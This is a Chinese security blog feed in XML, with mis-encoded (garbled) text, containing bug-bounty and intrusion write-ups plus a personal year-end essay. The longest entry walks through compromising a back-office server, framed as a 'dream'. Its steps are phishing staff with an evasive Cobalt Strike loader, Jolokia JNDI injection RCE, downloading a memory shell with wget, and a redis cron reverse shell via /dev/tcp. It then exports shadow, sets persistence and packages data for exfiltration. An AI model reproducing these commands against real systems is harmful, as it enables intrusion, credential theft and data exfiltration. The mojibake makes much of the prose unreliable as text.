æµ‹è¯•ç¯å¢ƒé»˜è®¤keyçš„åŸç½ªåˆ°RCE</h2><p>éšååœ¨ä¸‹é¢å››ä¸ªéšè—å­åŸŸå°è¯•é»˜è®¤keyæ·»åŠ æ¶æ„luaè·¯ç”±ï¼Œå‘ç°å‡æˆåŠŸ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223697.png" alt="image-20230222002214957"></p><p>æ·»åŠ æ¶æ„è·¯ç”±åï¼Œå°±æ˜¯ä¸€é©¬å¹³å·ï¼Œç›´æ£é»„é¾™äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223724.png" alt="image-20230222002331575"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223274.png" alt="image-20230222002411093"></p><p>ç›®æ ‡æ˜¯è¿è¡Œåœ¨k8sä¸Šçš„ï¼ŒææŒ‡ä¸€ç®—åº”è¯¥æ˜¯æµ‹è¯•ç¯å¢ƒç”¨äº†é»˜è®¤keyçš„è€é•œåƒï¼Œè¿ç»´ä¹Ÿæ²¡åšä¿®æ”¹ï¼Œå¯¼è‡´äº†RCEçš„å¤§é”…</p><p>äº¤å®Œå››å¤„å‘½ä»¤æ‰§è¡Œï¼Œå¥–åŠ±è‡ªå·±æ™šä¸Šåƒé¸¡è›‹è‚ ç²‰åŠ æ ¹è‚ </p><h2 id="0x06-æŠ€æœ¯ç‚¹æ€»ç»“"><a href="#0x06-æŠ€æœ¯ç‚¹æ€»ç»“" class="headerlink" title="0x06 æŠ€æœ¯ç‚¹æ€»ç»“"></a>0x06 æŠ€æœ¯ç‚¹æ€»ç»“</h2><p>ç»“åˆç›®æ ‡åŸŸåå‘½åç‰¹ç‚¹ï¼Œå‘ç°éšè—çš„å¼€å‘ã€æµ‹è¯•ç¯å¢ƒèµ„äº§</p><p>å®Œæˆæ–°çªç ´</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´å°è®° - è¿™ä¸–ç•Œé‚£ä¹ˆå¤šäºº</title>
      <link href="/2022/12/29/2022%E5%B9%B4%E5%B0%8F%E8%AE%B0-%E8%BF%99%E4%B8%96%E7%95%8C%E9%82%A3%E4%B9%88%E5%A4%9A%E4%BA%BA/"/>
      <url>/2022/12/29/2022%E5%B9%B4%E5%B0%8F%E8%AE%B0-%E8%BF%99%E4%B8%96%E7%95%8C%E9%82%A3%E4%B9%88%E5%A4%9A%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è¿™ä¸–ç•Œæœ‰é‚£ä¹ˆå¤šäºº </p><p>äººç¾¤é‡Œ æ•ç€ä¸€æ‰‡é—¨ </p><p>æˆ‘è¿·æœ¦çš„çœ¼ç›é‡Œé•¿å­˜ </p><p>åˆè§ä½  è“è‰²æ¸…æ™¨</p><p>è«æ–‡è”šã€Šè¿™ä¸–ç•Œé‚£ä¹ˆå¤šäººã€‹</p></blockquote><p><strong>è¿™ä¸–ç•Œé‚£ä¹ˆå¤šäºº</strong></p><p><a href="https://music.163.com/#/song?id=1842025914&market=baiduqk">https://music.163.com/#/song?id=1842025914&amp;market=baiduqk</a></p><p>éŸ³ä¹ï¼šè«æ–‡è”š - è¿™ä¸–ç•Œé‚£ä¹ˆå¤šäºº (ç”µå½±ã€Šæˆ‘è¦æˆ‘ä»¬åœ¨ä¸€èµ·ã€‹ä¸»é¢˜æ›²)<img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330605.jpg" alt="img"></p><p>æœ¬æ–‡å»ºè®®æ‰“å¼€ä¸Šæ–¹çš„éŸ³ä¹åé˜…è¯»ğŸµ</p><p>èµ°è¿‡ä¸€å¹´çƒŸé›¨ï¼Œåå¤©é™¤å¤•å°†è‡³ï¼Œé¢å¯¹ä¸€å¼ ç™½çº¸ï¼Œæ— è¯­å‡å™ï¼Œä¸çŸ¥ä»ä½•ä¸‹ç¬”ï¼Œå§‘ä¸”ä»è‡ªå·±çš„ä¸€ç‚¹æ‚æ„Ÿè¯´å¼€å»ã€‚</p><p>ç»æµè¡°é€€çš„æ—¶ä»£èƒŒæ™¯ä¸‹ï¼Œè¦†å·¢ä¹‹ä¸‹æ— å®Œåµï¼Œ2022å¹´ä¹Ÿè®¸æ˜¯å¾ˆå¤šäººäº‹ä¸šå’Œç²¾ç¥ä¸Šé¢‡ä¸ºè‰°éš¾çš„ä¸€å¹´ï¼Œç¬”è€…ä¹Ÿä¸ä¾‹å¤–ã€‚åŠ å† ä¹‹å¹´çš„è‡ªå·±ï¼Œç»å†äº†è‚¡ç¥¨å¤§è·Œï¼Œå®‰å…¨è¡Œä¸šä¸šåŠ¡è®¢å•é‡éª¤å‡ï¼ŒR2é£é™©æ— äºæŸè®°å½•çš„ç†è´¢äº§å“å‡ºç°äºæŸï¼Œæ–°å† å°æ§ä¸æ”¾å¼€å¸¦æ¥çš„åŒé‡ç²¾ç¥æ–½å‹ï¼ˆç¬”è€…çš„æ”¯æ°”ç®¡å’Œè‚ºå¤šå¹´å‰ä¸€ç›´æœ‰è€æ¯›ç—…åœ¨èº«ï¼‰ã€‚ç²¾ç¥ä¸ç‰©è´¨çš„åŒé‡å›°æ‰°ï¼Œè®©ä¸´è¿‘å¹´æœ«çš„ç¬”è€…åƒæäº†é‚£è¢«é”¤äº†çš„ç‰›ï¼ŒåŠ³ç¥è‹¦æ€ä¹Ÿåªèƒ½è½å¾—ä¸€ä¸ªé»¯ç„¶ç¥ä¼¤çš„ç»“å°¾ã€‚</p><p>å°¤è®°å¾—ä»Šå¹´å¹´åˆä¹‹æ—¶ï¼Œè‡ªå·±æ‰‹ä¸Šçš„ç”µè„‘åˆšåˆšåˆ°è´§ï¼Œæ„Ÿè§‰ä¸€åˆ‡æœªæ¥å¯æœŸï¼Œå¯è°“æ˜¥é£å¾—æ„é©¬è¹„ç–¾ï¼Œæ„Ÿè§‰è‡ªå·±åƒæäº†ç‹å°æ³¢ã€Šé»„é‡‘æ—¶ä»£ã€‹é‡Œé¢é‚£ç‰‡çšæ´æœˆå…‰ä¸‹çš„äººï¼Œä¸‡ç±»éœœå¤©ç«è‡ªç”±ï¼Œçˆ±æˆ‘æ‰€çˆ±ï¼Œè¡Œæˆ‘æ‰€è¡Œï¼Œä»€ä¹ˆéƒ½é”¤ä¸äº†è‡ªå·±ã€‚å¯æƒœäº‹å®è¿˜æ˜¯æ›´åƒè¿™æ®µ</p><blockquote><p>é‚£ä¸€å¤©æˆ‘äºŒåä¸€å²ï¼Œåœ¨æˆ‘ä¸€ç”Ÿçš„é»„é‡‘æ—¶ä»£ã€‚æˆ‘æœ‰å¥½å¤šå¥¢æœ›ã€‚æˆ‘æƒ³çˆ±ï¼Œæƒ³åƒï¼Œè¿˜æƒ³åœ¨ä¸€ç¬é—´å˜æˆå¤©ä¸ŠåŠæ˜åŠæš—çš„äº‘ã€‚åæ¥æˆ‘æ‰çŸ¥é“ï¼Œç”Ÿæ´»å°±æ˜¯ä¸ªç¼“æ…¢å—é”¤çš„è¿‡ç¨‹ï¼Œäººä¸€å¤©å¤©è€ä¸‹å»ï¼Œå¥¢æœ›ä¹Ÿä¸€å¤©å¤©æ¶ˆå¤±ï¼Œæœ€åå˜å¾—åƒæŒ¨äº†é”¤çš„ç‰›ä¸€æ ·ã€‚å¯æ˜¯æˆ‘è¿‡äºŒåä¸€å²ç”Ÿæ—¥æ—¶æ²¡æœ‰é¢„è§åˆ°è¿™ä¸€ç‚¹ã€‚æˆ‘è§‰å¾—è‡ªå·±ä¼šæ°¸è¿œç”ŸçŒ›ä¸‹å»ï¼Œä»€ä¹ˆä¹Ÿé”¤ä¸äº†æˆ‘ã€‚</p><p>ç‹å°æ³¢ã€Šé»„é‡‘æ—¶ä»£ã€‹</p></blockquote><p>   é‚£å¹´æˆ‘åŒæ‰‹æ’å…œï¼Œå´è¢«æ‰“çš„ä¸çŸ¥æ€ä¹ˆè¿˜æ‰‹ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330678.jpeg" alt="å›¾ç‰‡"></p><p>â€‹    2022ä¹Ÿå‚åŠ äº†ä¸å°‘æ¯”èµ›ï¼Œæœ‰æŠ€æœ¯æ¯”èµ›ï¼Œä¹Ÿæœ‰åˆ›æ–°åˆ›ä¸šæ¯”èµ›ï¼Œå‡ºäº†ä¸é”™çš„æˆæœï¼Œæ‹¿è¿‡ä¸é”™çš„åæ¬¡ï¼Œæ”¶è·äº†ä¸€å †ä¸çŸ¥é“æœ‰å•¥ç”¨çš„è¯ä¹¦ã€å¥–æ¯ã€‚å›é¦–çœ‹æ¥è¿™äº›ä¸œè¥¿çš„ä»·å€¼å¹¶ä¸æ¯”æ“¦å±è‚¡çº¸é«˜å¤šå°‘ï¼Œé¢‡æœ‰ä¸€ç§â€œä¸‰ååŠŸåå°˜ä¸åœŸâ€çš„æ„Ÿè§‰ã€‚å›å®¶è¿‡å¹´æŠŠæ”’äº†ä¸€å¹´çš„ä¼˜è´¨â€œèŒ…æˆ¿çº¸â€æ”¾åˆ°è‡ªå·±çš„ä¹¦æ¶ä¸Šï¼Œå¶ç„¶é—´å‘ç°è‡ªå·±ä»å„å®¶ç”²ä¹™æ–¹å¹³å°å’ŒSRCæ”¶é›†è€Œæ¥çš„å°æ‰‹åŠå·²æœ‰å¦‚æ­¤ä¹‹å¤šï¼Œå¯’å†¬è…Šæœˆé‡Œæ„Ÿæ…¨ä¸‡åˆ†ã€‚</p><p>PSï¼šå¤§å®¶å¯ä»¥çœ‹çœ‹èƒ½è®¤å‡ºå¤šå°‘å›¾ä¸­æ‰‹åŠå¯¹åº”çš„å‚å•†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330968.png" alt="å›¾ç‰‡"></p><p>â€‹    ä»2015å¹´çš„ç¬¬ä¸€ä¸ªæ¼æ´è‡³ä»Šï¼Œå·²æœ‰å…«å¹´ï¼Œæ¯ä¸€ä¸ªå°æ‰‹åŠè®°å½•ç€é‚£æ®µå›ä¸å»çš„æ—¶å…‰ï¼Œè®°å½•ç€æˆ‘ä¸æ¼æ´çš„å‰å°˜å¾€äº‹ï¼Œè®°å½•ç€æˆ‘ä¸è¿™ä¸–ä¸Šé‚£ä¹ˆå¤šäººçš„èæ°´ç›¸é€¢ï¼Œè®©äººæ¸©æš–åˆå¹¸ç¦ã€‚</p><p>â€‹    å°¤è®°å¾—ä»Šå¹´æ˜¯è…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒæˆç«‹çš„ç¬¬åå¹´ï¼Œè‡ªå·±ä»Šå¤©æ‰“æ‰«ä¹¦æ¶æ—¶ï¼Œæ‰¾åˆ°äº†TSRCäº”å‘¨å¹´æ—¶é€æ¥çš„é‚£æ¬¾å…«éŸ³ç›’ï¼Œæ‰­åŠ¨æŒ‰é’®ï¼Œé‡Œé¢ç¼“ç¼“æ’­æ”¾å‡ºã€Šå¤©ç©ºä¹‹åŸã€‹ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330087.png" alt="å›¾ç‰‡"></p><p>â€‹    </p><p>â€‹    å‰å°˜éš”æµ·ï¼Œå¤å±‹ä¸å†ï¼Œé‡å¯å…«éŸ³ç›’ï¼Œæ€ç»ªå¦‚æ³‰æ¶Œã€‚æè§‰äººç”Ÿåœ¨ä¸–çºµç„¶ä¸ç§°æ„ï¼Œä¸æœ‰æƒ…æœ‰ä¹‰ä¹‹äººçš„èæ°´ç›¸é€¢ï¼Œèƒ½å¤Ÿåœ¨è‡ªå·±çƒ­çˆ±çš„é¢†åŸŸå‘å…‰å‘çƒ­ã€æ·±è€•å…¶ä¸­ä¾¿æ˜¯æœ€å¤§çš„æ…°è—‰ï¼Œæœ€å¤§çš„äººé—´å€¼å¾—ã€‚</p><p>â€‹    ä¸åŒäºå…«éŸ³ç›’çš„è¯‰è¯´ï¼Œèº«æ—é‚£ä¹ˆå¤šäººï¼Œå¯ä¸–ç•Œä¸å£°ã€ä¸å“ã€‚</p><p>â€‹    å›æœ›è¿™äº›å¹´æµ®ç”Ÿäºä¸–ï¼Œæˆ‘ä¸€ç›´æŠŠè‡ªå·±çš„ç†æƒ³ä¸ä½¿å‘½å®šä½äºï¼šå’Œä¸€å¸®æœ‰æƒ…æœ‰ä¹‰çš„äººï¼Œå…±åŒåšä¸€ä»¶æœ‰ä»·å€¼çš„äº‹ï¼Œè€Œè¿™ä»¶äº‹æœ€ç»ˆèƒ½æ”¹å˜ä¸­å›½ä¹ƒè‡³ä¸–ç•Œçš„ç½‘ç»œå®‰å…¨è¡Œä¸šã€‚æˆ‘éšçº¦æ„Ÿå—åˆ°ï¼Œè‡ªå·±ç¦»è·µè¡Œä½¿å‘½çš„æœºä¼šå·²ç»ä¸å†é¥è¿œã€‚ä¹Ÿè®¸æ˜å¤©ä¸ä¼šæ›´å¥½ï¼Œä½†æ˜¯è¯·ç›¸ä¿¡ï¼Œæ˜å¤©ä¼šæœ‰è·µè¡Œè‡ªèº«ä»·å€¼çš„æ›´å¥½æœºä¼šã€‚</p><p>â€‹    </p><p>â€‹    è‡´è¿‡å»ã€ç°åœ¨ã€æœªæ¥çš„åŒè¡Œè€…ä»¬ï¼Œè¿‡å¾€çš„é˜´éœ¾ç»ˆä¼šæ•£å»ï¼Œè®©æˆ‘ä»¬ä¸€åŒæ‹¥æŠ±æ»šçƒ«çš„æ˜å¤©ï¼Œå³å°†åˆ°æ¥çš„2023ï¼</p><p>â€‹    æ„Ÿè°¢è¯»åˆ°è¿™é‡Œçš„ä½ ï¼Œè¨€å°½äºæ­¤ï¼Œè®©æˆ‘ä»¬æ±Ÿæ¹–å†ä¼šã€‚</p><p>â€‹                                                    </p><p>â€‹                                      J0o1eyäº2022å¹´12æœˆ29æ—¥18:00</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç”Ÿæ´»å¶æ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(å…«)-æ¢¦ä¸­ç»æ€æŸè„–ä»£ç†å•†åå°</title>
      <link href="/2022/03/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AB-%E6%A2%A6%E4%B8%AD%E7%BB%9D%E6%9D%80%E6%9F%90%E8%84%96%E4%BB%A3%E7%90%86%E5%95%86%E5%90%8E%E5%8F%B0/"/>
      <url>/2022/03/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AB-%E6%A2%A6%E4%B8%AD%E7%BB%9D%E6%9D%80%E6%9F%90%E8%84%96%E4%BB%A3%E7%90%86%E5%95%86%E5%90%8E%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>å‰ä¸¤å¤©åœ¨å›½ä¼çš„æœ‹å‹é‡åˆ°äº†ä¸€ä¸ªæ£˜æ‰‹çš„é¶æ ‡ï¼Œå¬è¯´ä¹‹å‰æ²¡äººèƒ½ä»å¤–ç½‘æ‰“ç‚¹è¿›å»ï¼Œåªèƒ½é ä¸‡é‡Œé˜²ç«å¢™å–è¯</strong></p><p><strong>æˆ‘ä¸€å¬æ¥äº†å…´è¶£ï¼Œåœ¨æ¢¦ä¸­è‡†é€ äº†ä¸€ä¸ªé¶åœºè¿›è¡Œæ¸—é€ï¼Œå¹¶ä¸”è¯¥æ¢¦å¢ƒå·²è·å¾—ç›¸å…³æˆæƒ</strong></p><p><strong>è¿˜è¯·å„ä½çœ‹å®˜è¯·å‹¿å¯¹å·å…¥åº§ï¼Œå¦‚æœ‰é›·åŒï¼Œçº¯å±å·§åˆ</strong></p><h2 id="0x01-é’“é±¼æ‰“ç‚¹"><a href="#0x01-é’“é±¼æ‰“ç‚¹" class="headerlink" title="0x01 é’“é±¼æ‰“ç‚¹"></a>0x01 é’“é±¼æ‰“ç‚¹</h2><p>å®˜ç½‘å‘ç°äº†å®¢æœè”ç³»æ–¹å¼</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220437.jpg" alt="image-20220316104511285"></p><p>é€šè¿‡ä¿®æ”¹ shellcodeç‰¹å¾çš„CS + å…æ€åŠ è½½å™¨ï¼Œç›´æ¥åšå‡ºå…æ€ğŸ´ã€‚</p><p>æ”¹åç¼€åä¸ºéexe(æ‡‚çš„éƒ½æ‡‚)ï¼Œç›´æ¥ç”¨è¯æœ¯é’“é±¼å®¢æœ(ç°åœ¨å®¢æœéƒ½èªæ˜äº†ï¼Œç›´æ¥exeæ˜¯è‚¯å®šé’“ä¸åˆ°çš„)ï¼Œè·å¾—å…¶æ¡Œé¢è®°äº‹æœ¬</p><p>è®°äº‹æœ¬ä¸­ç¿»å‡ºæ¥äº†åå°åœ°å€ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è´¦å·å¯†ç (æœ‰ä¹Ÿæ²¡æœ‰ç”¨ï¼Œå› ä¸ºæœ‰GoogleéªŒè¯ç )</p><p><a href="http://xxxxx/xxxxx-admin/">http://xxxxx/xxxxx-admin/</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220783.jpg" alt="image-20220316105840446"></p><h2 id="0x02-FUZZå¾—åˆ°Spring-Actuatoræ³„éœ²ï¼Œå¹¶åˆ†æä¿¡æ¯"><a href="#0x02-FUZZå¾—åˆ°Spring-Actuatoræ³„éœ²ï¼Œå¹¶åˆ†æä¿¡æ¯" class="headerlink" title="0x02 FUZZå¾—åˆ°Spring Actuatoræ³„éœ²ï¼Œå¹¶åˆ†æä¿¡æ¯"></a>0x02 FUZZå¾—åˆ°Spring Actuatoræ³„éœ²ï¼Œå¹¶åˆ†æä¿¡æ¯</h2><p>FUZZäº†ä¸€ä¸‹ï¼Œå‡ºäº†äºŒçº§ç›®å½•Spring Actuatorçš„æ³„éœ²</p><p><a href="http://xxxxx/xxxxx-admin/actuator/">http://xxxxx/xxxxx-admin/actuator/</a></p><p>å‘ç°äº†è€æœ‹å‹jolokia</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220148.jpg" alt="image-20220314225017970"></p><p>jolokiaç»„ä»¶ï¼Œç†Ÿæ‚‰Springæµ‹è¯•çš„å…„å¼Ÿéƒ½çŸ¥é“ï¼Œä¸å‡ºæ„å¤–å¯ä»¥ç›´æ¥ç§’~</p><p>åˆè®¿é—®äº†å‡ ä¸ªå¸¸è§çš„ç«¯ç‚¹</p><p><a href="http://xxxxx/xxxxx-admin/actuator/env">http://xxxxx/xxxxx-admin/actuator/env</a></p><p>é€šè¿‡envç«¯ç‚¹å¯çŸ¥ï¼Œè¯¥åå°æ‰˜ç®¡åœ¨äºšé©¬é€Šäº‘ï¼Œå¹¶ä¸”æ²¡æœ‰æ³„éœ²akï¼Œskç­‰ä¿¡æ¯</p><p>ç¿»æ¥è¦†å»ï¼Œåªçœ‹åˆ°æœ‰ä¸ªredisçš„å¯†ç </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220553.jpg" alt="image-20220316103343362"></p><p>çœ‹äº†ä¸‹beansç«¯ç‚¹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°èƒ½ç”¨æ¥ç›´æ¥dumpå‡ºæ˜Ÿå·å¯†ç çš„åˆé€‚Mbeanï¼Œæ‰€ä»¥æ”¾å¼ƒç›´æ¥é€šè¿‡jolokiaè°ƒç”¨mbeanè·å–æ˜æ–‡</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220950.jpg" alt="image-20220316120045893"></p><p><a href="http://xxxxx/xxxxx-admin/actuator/heapdump">http://xxxxx/xxxxx-admin/actuator/heapdump</a></p><p>é€šè¿‡ä¸‹è½½heapdumpï¼Œè¿›å…¥Matåˆ†æ</p><pre><code>select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220476.jpg" alt="image-20220316111928566"></p><p>è°ƒè¯•åå‘ç°redisé…ç½®çš„é“¾æ¥åœ°å€æ˜¯127.0.0.1ï¼Œå¯†ç ä¸ºç©ºï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¼€æ”¾ç«¯å£å¤–é“¾ï¼Œé‚£åªèƒ½å…ˆç•™ç€äº†</p><h2 id="0x03-Jolokia-Realm-JNDIæ³¨å…¥-rce"><a href="#0x03-Jolokia-Realm-JNDIæ³¨å…¥-rce" class="headerlink" title="0x03 Jolokia Realm JNDIæ³¨å…¥ rce"></a>0x03 Jolokia Realm JNDIæ³¨å…¥ rce</h2><p><a href="https://xxxx/xxxxx-admin/actuator/jolokia/">https://xxxx/xxxxx-admin/actuator/jolokia/</a></p><p>æ ¹æ®å¾—åˆ°jolokiaç«¯ç‚¹</p><p>ç›´æ¥RCEæ‰“è¯•è¯•</p><p>åˆ©ç”¨æ¡ä»¶ä¸ºï¼š</p><ul><li>ç›®æ ‡ç½‘ç«™&#x2F;jolokia&#x2F;list æ¥å£å­˜åœ¨ type&#x3D;MBeanFactory å’Œ createJNDIRealm å…³é”®è¯ </li><li>è¯·æ±‚å¯å‡ºå¤–ç½‘</li></ul><p>å‘½ä»¤ç¼–ç åœ°å€ï¼š<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a> </p><p>ç¼–ç åå¼¹Shellçš„å‘½ä»¤</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220063.jpg" alt="image-20220314225702388"></p><p>ç”¨JNDI-Injection-Exploitç›´æ¥èµ·ä¸ªæ¶æ„RmiæœåŠ¡</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C â€œcommandâ€ -A vps_ip</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220531.jpg" alt="image-20220316105555152"></p><p>ç›´æ¥ä¿®æ”¹å¥½è„šæœ¬</p><p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220057.jpg" alt="image-20220314231220102"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220456.jpg" alt="image-20220314232723932"></p><p>è¿æ°”ä¸é”™ï¼Œç›®æ ‡å‡ºç½‘ï¼Œç›´æ¥ç§’äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220889.jpg" alt="image-20220316120905094"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220354.jpg" alt="image-20220315000605462"></p><p>wwwæƒé™</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220869.jpg" alt="image-20220316122240804"></p><h2 id="0x04åå¼¹shellåçš„å–è¯"><a href="#0x04åå¼¹shellåçš„å–è¯" class="headerlink" title="0x04åå¼¹shellåçš„å–è¯"></a>0x04åå¼¹shellåçš„å–è¯</h2><p>historyï¼Œlastã€hostsï¼Œä¸­é—´ä»¶æ—¥å¿—ç­‰å¸¸è§„å–è¯å°±ä¸è¯´äº†</p><p>ç›®æ ‡çš„è¿ç»´è¿˜æ˜¯æ¯”è¾ƒè°¨æ…çš„ï¼Œæ²¡æœ‰ç›´è¿ï¼Œè€Œæ˜¯ä»¥ä¸€å°äºšé©¬é€Šäº‘çš„ä¸»æœºä¸ºè·³æ¿è¿›è¡ŒSSHé“¾æ¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220161.jpg" alt="image-20220316123029874"></p><p>è¿›ç¨‹çœ‹äº†ä¸€ä¸‹ï¼Œwebç¨‹åºç”¨çš„æ˜¯MVCæ¶æ„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220141.jpg" alt="image-20220316122758785"></p><h2 id="0x05-æ³¨å…¥å†…å­˜ğŸ´"><a href="#0x05-æ³¨å…¥å†…å­˜ğŸ´" class="headerlink" title="0x05 æ³¨å…¥å†…å­˜ğŸ´"></a>0x05 æ³¨å…¥å†…å­˜ğŸ´</h2><p>ä¸ºäº†é˜²æ­¢åå¼¹çš„Shelléšæ—¶GGï¼Œæ‰€ä»¥é€‰æ‹©æ³¨ä¸ªå†…å­˜é©¬åˆ°Tomcat</p><p>æ¯”è¾ƒæ¶å¿ƒçš„æ˜¯ç›®æ ‡ç”¨çš„MVCæ¶æ„ï¼Œè·¯ç”±é»˜è®¤éƒ½æ˜¯ç›´æ¥302è·³è½¬åå°çš„è·¯ç”±ï¼Œå¯¼è‡´ä¸å°‘å†…å­˜é©¬æ²¡æ³•ç›´æ¥ç”¨ï¼Œæ—¶é—´ç´§æ€¥ï¼Œå»Gitç¿»äº†ä¸€ä¸ªagentå‹çš„å†…å­˜é©¬</p><p><a href="https://github.com/WisteriaTiger/JundeadShell">https://github.com/WisteriaTiger/JundeadShell</a></p><p>ç›´æ¥å—æ§æœºæ¢­å“ˆ</p><pre><code class="shell">wget x.x.x.x:50000/agent_starter.jarnohup java -jar agent_starter.jar &quot;java_process_name&quot; 8 &amp;</code></pre><p>æŒ‚ä¸ŠBurpè®¿é—®é¶æ ‡ï¼Œæ‰¾åˆ°äº†ä¸ªä¸302è·³è½¬çš„æ¥å£ï¼ŒåŠ ä¸Šå¯†ç ï¼Œè®¿é—®å†…å­˜é©¬æˆåŠŸ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220502.jpg" alt="image-20220316124212144"></p><h2 id="0x06-å€Ÿç”¨redisæƒé™æå‡"><a href="#0x06-å€Ÿç”¨redisæƒé™æå‡" class="headerlink" title="0x06 å€Ÿç”¨redisæƒé™æå‡"></a>0x06 å€Ÿç”¨redisæƒé™æå‡</h2><p>ç›®æ ‡ä¸ºwwwæƒé™ï¼Œè€Œä¸”ç”¨çš„äºšé©¬é€Šäº‘ï¼ŒåŠæ—¶æ‰“äº†è¡¥ä¸ï¼Œæœ€è¿‘çš„ç•ªå·pkexecï¼Œdirty pipeç­‰æµ‹è¯•åä¸å¥½ä½¿ï¼Œè„ç‰›ç­‰è€å¤è‘£æ›´ä¸è¡Œ</p><p>GUIDï¼ŒSUIDæŸ¥äº†ä¸€éï¼Œæ²¡æœ‰è¯¯é…</p><p>æœ€åéƒ½å¿«æ”¾å¼ƒçš„æ—¶å€™çœ‹äº†ä¸€çœ¼è¿›ç¨‹ï¼Œredisæ˜¯ä»¥rootæƒé™è¿è¡Œçš„â€¦å¤©åŠ©æˆ‘ä¹Ÿ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220122.jpg" alt="image-20220316143058190"></p><p>ç›´æ¥é€šè¿‡ç«¯å£è½¬å‘ç¨‹åºæŠŠredisçš„ç«¯å£è½¬å‘åˆ°æœ¬åœ°</p><p>åˆ©ç”¨rediså†™è®¡åˆ’ä»»åŠ¡</p><p>ï¼ˆPS:Ubuntuä¸‹ä¼šå› ä¸ºå¤¹æ‚äº†è„æ•°æ®å¯¼è‡´è¯­æ³•æ— æ³•è¯†åˆ«è€Œä»»åŠ¡å¤±æ•ˆï¼›ä½†å¯¹äºcentosç³»ç»Ÿåˆ™æ²¡æœ‰å½±å“ï¼Œå¯ä»¥æˆåŠŸè¢«åˆ©ç”¨ï¼Œé¶æ ‡ä¸ºcentosï¼‰</p><pre><code class="shell">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n&quot;|redis-cli -h xx.xx.xx.xx -x set 1 #è®¾å®šå€¼redis-cli -h xx.xx.xx.xx config set dir /var/spool/cron/redis-cli -h xx.xx.xx.xx config set dbfilename rootredis-cli -h xx.xx.xx.xx save</code></pre><p>ncç›‘å¬æœ¬åœ°ï¼Œæ²¡è¿‡ä¸€ä¼šï¼Œrootæƒé™çš„shellå°±å¼¹å›æ¥äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220392.jpg" alt="image-20220316140326981"></p><p>éšååˆæŠŠshadowå¯¼å‡ºï¼Œå–è¯äº†rootç”¨æˆ·ç›®å½•ä¸‹çš„éƒ¨åˆ†ä¸œè¥¿ï¼Œåšäº†éƒ¨åˆ†æƒé™ç»´æŒ</p><h2 id="0x07-æ–‡ä»¶å–è¯èµ„æ–™å›ä¼ "><a href="#0x07-æ–‡ä»¶å–è¯èµ„æ–™å›ä¼ " class="headerlink" title="0x07 æ–‡ä»¶å–è¯èµ„æ–™å›ä¼ "></a>0x07 æ–‡ä»¶å–è¯èµ„æ–™å›ä¼ </h2><p>æŠŠå–è¯å¥½çš„ç½‘ç«™JaråŒ…ï¼Œç›®å½•æ—¥å¿—ï¼Œç™»é™†æ—¥å¿—æ‰“åŒ…å¥½ï¼Œè¶³è¶³æœ‰å‡ ä¸ªGï¼Œå›ä¼ æ–‡ä»¶æˆäº†éš¾äº‹</p><pre><code>tar -cvf xxxx.tar 